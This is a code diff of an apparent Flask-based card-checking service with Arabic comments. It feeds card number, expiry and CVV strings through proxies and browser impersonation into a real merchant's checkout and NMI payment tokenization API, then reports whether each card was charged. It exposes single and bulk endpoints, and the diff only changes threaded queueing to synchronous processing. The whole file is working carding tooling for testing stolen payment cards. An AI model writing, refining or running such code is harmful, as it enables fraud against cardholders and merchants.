@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify
-import threading
 import time
 import re
 import random
@@ -9,23 +8,12 @@ from bs4 import BeautifulSoup
 import json
 import logging
 from datetime import datetime
-import queue
 
 app = Flask(__name__)
 
 # إعدادات التسجيل
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
-
-# تخزين النتائج
-results = {}
-results_lock = threading.Lock()
-task_counter = 0
-task_counter_lock = threading.Lock()
-
-# قائمة انتظار المهام
-task_queue = queue.Queue()
-MAX_WORKERS = 20  # عدد المعالجات المتوازية
 
 # قائمة اليوزرات
 usernames = [
@@ -81,17 +69,15 @@ def get_random_username():
     """اختيار يوزر عشوائي"""
     return random.choice(usernames)
 
-def process_card(ccx, task_id):
-    """معالجة بطاقة واحدة - تعمل في thread منفصل"""
+def process_card_sync(ccx):
+    """معالجة بطاقة واحدة - تعمل بشكل متزامن وترجع النتيجة مباشرة"""
     try:
-        logger.info(f"Task {task_id}: Starting processing for card")
+        logger.info(f"Starting processing for card: {ccx[:10]}...")
         
         ccx = ccx.strip()
         parts = ccx.split("|")
         if len(parts) < 4:
-            with results_lock:
-                results[task_id] = {"status": "error", "message": "Invalid format"}
-            return
+            return {"status": "error", "message": "Invalid format"}
         
         n = parts[0]
         mm = parts[1]
@@ -109,7 +95,7 @@ def process_card(ccx, task_id):
         
         # إنشاء جلسة جديدة لكل طلب
         session = requests.Session(
-            impersonate="chrome124",
+            impersonate="chrome110",
             proxies=proxies,
             timeout=30,
         )
@@ -121,7 +107,7 @@ def process_card(ccx, task_id):
         }
         
         # ====== الخطوة 1: الحصول على الصفحة الأولى ======
-        logger.info(f"Task {task_id}: Getting initial page")
+        logger.info("Getting initial page")
         response = session.get('https://boostme.com/tiktok-followers/tiktok-account-information/100-followers')
         soup = BeautifulSoup(response.text, 'html.parser')
         
@@ -142,14 +128,12 @@ def process_card(ccx, task_id):
         # استخراج ID
         v2_match = re.search(r'/cart-summary/([a-f0-9-]+)', response.text)
         if not v2_match:
-            with results_lock:
-                results[task_id] = {"status": "error", "message": "Failed to get cart ID"}
-            return
+            return {"status": "error", "message": "Failed to get cart ID"}
         cart_id = v2_match.group(1)
-        logger.info(f"Task {task_id}: Cart ID: {cart_id}")
+        logger.info(f"Cart ID: {cart_id}")
         
         # ====== الخطوة 2: جلب صفحة Cart Summary ======
-        logger.info(f"Task {task_id}: Getting cart summary")
+        logger.info("Getting cart summary")
         response = session.get(f'https://boostme.com/cart-summary/{cart_id}')
         soup = BeautifulSoup(response.text, 'html.parser')
         
@@ -170,14 +154,12 @@ def process_card(ccx, task_id):
         
         checkout_match = re.search(r'/solid-gate-checkout/create-payment/([a-f0-9]+)', response.text)
         if not checkout_match:
-            with results_lock:
-                results[task_id] = {"status": "error", "message": "Failed to get transaction ID"}
-            return
+            return {"status": "error", "message": "Failed to get transaction ID"}
         transaction_id = checkout_match.group(1)
-        logger.info(f"Task {task_id}: Transaction ID: {transaction_id}")
+        logger.info(f"Transaction ID: {transaction_id}")
         
         # ====== الخطوة 3: إنشاء Token ======
-        logger.info(f"Task {task_id}: Creating token")
+        logger.info("Creating token")
         data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
             'cartCorrelationId': '',
@@ -186,7 +168,7 @@ def process_card(ccx, task_id):
         
         response = session.post('https://secure.nmi.com/token/api/create', headers=headers, data=data)
         token_id = response.json()['token']
-        logger.info(f"Task {task_id}: Token created: {token_id}")
+        logger.info(f"Token created: {token_id}")
         
         # ====== الخطوة 4: إرسال بيانات البطاقة ======
         headers_json = {
@@ -199,7 +181,7 @@ def process_card(ccx, task_id):
         }
         
         # إرسال رقم البطاقة
-        logger.info(f"Task {task_id}: Sending card number")
+        logger.info("Sending card number")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
             'cartCorrelationId': '',
@@ -209,7 +191,7 @@ def process_card(ccx, task_id):
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
         # إرسال تاريخ الانتهاء
-        logger.info(f"Task {task_id}: Sending expiry date")
+        logger.info("Sending expiry date")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
             'cartCorrelationId': '',
@@ -219,7 +201,7 @@ def process_card(ccx, task_id):
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
         # إرسال CVV
-        logger.info(f"Task {task_id}: Sending CVV")
+        logger.info("Sending CVV")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
             'cartCorrelationId': '',
@@ -229,7 +211,7 @@ def process_card(ccx, task_id):
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
         # Lookup
-        logger.info(f"Task {task_id}: Looking up token")
+        logger.info("Looking up token")
         json_data = {
             'tokenId': token_id,
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -238,7 +220,7 @@ def process_card(ccx, task_id):
         session.post('https://secure.nmi.com/token/api/lookup', json=json_data)
         
         # ====== الخطوة 5: تنفيذ الدفع ======
-        logger.info(f"Task {task_id}: Executing payment")
+        logger.info("Executing payment")
         json_data = {'token': token_id}
         response = session.post(
             f'https://boostme.com/nmi-checkout/create-payment/{transaction_id}',
@@ -255,54 +237,30 @@ def process_card(ccx, task_id):
         
         result = response.json()
         r = result.get('responsetext', '')
-        logger.info(f"Task {task_id}: Response: {r}")
+        logger.info(f"Response: {r}")
         
         # تخزين النتيجة
-        with results_lock:
-            if 'Approved' in r:
-                results[task_id] = {
-                    "status": "success", 
-                    "message": "Charged - 4$ !", 
-                    "details": r,
-                    "card": f"{n[:4]}****{n[-4:]}"
-                }
-            else:
-                results[task_id] = {
-                    "status": "failed", 
-                    "message": r,
-                    "card": f"{n[:4]}****{n[-4:]}"
-                }
-        
-        logger.info(f"Task {task_id}: Completed")
+        if 'Approved' in r:
+            return {
+                "status": "success", 
+                "message": "Charged - 4$ !", 
+                "details": r,
+                "card": f"{n[:4]}****{n[-4:]}"
+            }
+        else:
+            return {
+                "status": "failed", 
+                "message": r,
+                "card": f"{n[:4]}****{n[-4:]}"
+            }
             
     except Exception as e:
-        logger.error(f"Task {task_id}: Error - {str(e)}")
-        with results_lock:
-            results[task_id] = {"status": "error", "message": str(e)}
-
-def worker_thread():
-    """عامل يعمل في الخلفية لمعالجة المهام"""
-    while True:
-        try:
-            task_id, ccx = task_queue.get(timeout=1)
-            process_card(ccx, task_id)
-            task_queue.task_done()
-        except queue.Empty:
-            time.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Worker error: {str(e)}")
-            task_queue.task_done()
-
-# بدء العمال
-logger.info(f"Starting {MAX_WORKERS} worker threads")
-for i in range(MAX_WORKERS):
-    t = threading.Thread(target=worker_thread, daemon=True)
-    t.start()
-    logger.info(f"Worker {i+1} started")
+        logger.error(f"Error: {str(e)}")
+        return {"status": "error", "message": str(e)}
 
 @app.route('/charge', methods=['POST'])
 def charge_card():
-    """نقطة نهاية لشحن بطاقة واحدة - تعود فوراً مع task_id"""
+    """شحن بطاقة - يعيد النتيجة مباشرة"""
     try:
         data = request.get_json()
         if not data or 'cc' not in data:
@@ -310,26 +268,10 @@ def charge_card():
         
         ccx = data['cc']
         
-        # إنشاء معرف فريد للمهمة
-        with task_counter_lock:
-            global task_counter
-            task_counter += 1
-            task_id = task_counter
+        # معالجة البطاقة مباشرة
+        result = process_card_sync(ccx)
         
-        # إضافة المهمة إلى قائمة الانتظار
-        task_queue.put((task_id, ccx))
-        
-        # تخزين حالة مؤقتة
-        with results_lock:
-            results[task_id] = {"status": "queued", "message": "Task added to queue"}
-        
-        logger.info(f"Task {task_id}: Added to queue")
-        
-        return jsonify({
-            "task_id": task_id,
-            "status": "queued",
-            "message": "Card processing started"
-        }), 202
+        return jsonify(result), 200
         
     except Exception as e:
         logger.error(f"Error in charge endpoint: {str(e)}")
@@ -337,89 +279,39 @@ def charge_card():
 
 @app.route('/charge/bulk', methods=['POST'])
 def charge_bulk():
-    """نقطة نهاية لشحن عدة بطاقات دفعة واحدة"""
+    """شحن عدة بطاقات دفعة واحدة - يعيد النتائج مباشرة"""
     try:
         data = request.get_json()
         if not data or 'cards' not in data or not isinstance(data['cards'], list):
             return jsonify({"error": "Missing 'cards' list parameter"}), 400
         
         cards = data['cards']
-        task_ids = []
+        results = []
         
-        with task_counter_lock:
-            global task_counter
-            for ccx in cards:
-                task_counter += 1
-                task_id = task_counter
-                task_queue.put((task_id, ccx))
-                with results_lock:
-                    results[task_id] = {"status": "queued", "message": "Task added to queue"}
-                task_ids.append(task_id)
-                logger.info(f"Task {task_id}: Added to queue (bulk)")
+        for ccx in cards:
+            result = process_card_sync(ccx)
+            results.append({
+                "card": ccx[:10] + "...",
+                "result": result
+            })
         
         return jsonify({
-            "task_ids": task_ids,
-            "total": len(task_ids),
-            "status": "queued",
-            "message": f"{len(task_ids)} cards added to queue"
-        }), 202
+            "total": len(results),
+            "results": results
+        }), 200
         
     except Exception as e:
         logger.error(f"Error in bulk charge endpoint: {str(e)}")
         return jsonify({"error": str(e)}), 500
-
-@app.route('/status/<int:task_id>', methods=['GET'])
-def get_status(task_id):
-    """الحصول على حالة مهمة محددة"""
-    with results_lock:
-        if task_id in results:
-            return jsonify({
-                "task_id": task_id,
-                "result": results[task_id]
-            })
-        else:
-            return jsonify({
-                "task_id": task_id,
-                "status": "not_found",
-                "message": "Task ID not found"
-            }), 404
-
-@app.route('/status/all', methods=['GET'])
-def get_all_status():
-    """الحصول على حالة جميع المهام"""
-    with results_lock:
-        # إرجاع آخر 100 نتيجة فقط لتجنب الحمل الزائد
-        all_results = dict(list(results.items())[-100:])
-        return jsonify({
-            "total_tasks": len(results),
-            "results": all_results
-        })
 
 @app.route('/health', methods=['GET'])
 def health_check():
     """فحص صحي للخدمة"""
     return jsonify({
         "status": "healthy",
-        "workers": MAX_WORKERS,
-        "queue_size": task_queue.qsize(),
-        "results_count": len(results),
         "timestamp": datetime.now().isoformat()
     })
 
-@app.route('/clear', methods=['POST'])
-def clear_results():
-    """مسح النتائج القديمة"""
-    with results_lock:
-        # الاحتفاظ فقط بآخر 50 نتيجة
-        if len(results) > 50:
-            keys = list(results.keys())
-            for key in keys[:-50]:
-                del results[key]
-        return jsonify({
-            "status": "cleared",
-            "remaining": len(results)
-        })
-
 if __name__ == '__main__':
-    logger.info("Starting Flask API server on port 5000")
+    logger.info("Starting Flask API server on port 5000 (Synchronous mode)")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
